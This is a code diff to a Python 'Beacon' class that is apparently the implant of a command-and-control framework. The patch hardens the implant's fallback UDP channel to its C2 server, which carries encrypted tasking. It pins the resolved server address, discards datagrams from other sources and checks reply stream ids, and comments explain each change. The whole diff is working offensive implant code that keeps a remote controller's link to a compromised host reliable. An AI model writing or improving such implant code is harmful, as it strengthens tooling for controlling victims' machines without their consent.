@@ -7703,6 +7703,20 @@ class Beacon:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.settimeout(10)
 
+            # Resolved once, and kept, so an answer can be held to it. The
+            # loop below used to read with `recvfrom` and throw the source
+            # address away, so anything that could reach this ephemeral port
+            # could put a fragment into the reassembly. It cannot inject
+            # *tasking* -- that needs the key -- so what it costs is the
+            # channel, not control of it; but the listener keys its own
+            # reassembly on the sender's address, and a listener cannot
+            # compensate for a client that does not. Resolution happens here
+            # rather than per datagram because `c2.fallback.quic.server` may
+            # name a host, and the source of a legitimate answer is the
+            # address this actually sent to, not the name.
+            peer = socket.getaddrinfo(host, port, socket.AF_INET,
+                                      socket.SOCK_DGRAM)[0][4]
+
             # Fragment into 1200-byte QUIC-style datagrams
             frag_size = 1200
             total_frags = (len(frame) + frag_size - 1) // frag_size
@@ -7712,17 +7726,22 @@ class Beacon:
                 chunk = frame[i * frag_size:(i + 1) * frag_size]
                 # Header: [stream_id(4)][frag_index(2)][total_frags(2)][chunk]
                 dgram = struct.pack(">IHH", stream_id, i, total_frags) + chunk
-                sock.sendto(dgram, (host, port))
+                sock.sendto(dgram, peer)
 
             # Receive reassembled response
             fragments: dict = {}
             expected = None
             while True:
                 try:
-                    resp_data, _ = sock.recvfrom(1500)
-                    if len(resp_data) < 8:
+                    resp_data, src = sock.recvfrom(1500)
+                    if src != peer or len(resp_data) < 8:
                         continue
                     r_stream, r_idx, r_total = struct.unpack(">IHH", resp_data[:8])
+                    # The listener echoes the request's stream id
+                    # (`listeners/quic.py:_send_frame`), so a fragment under
+                    # another one is nobody's answer to this exchange.
+                    if r_stream != stream_id:
+                        continue
                     expected = r_total
                     fragments[r_idx] = resp_data[8:]
                     if len(fragments) == expected:
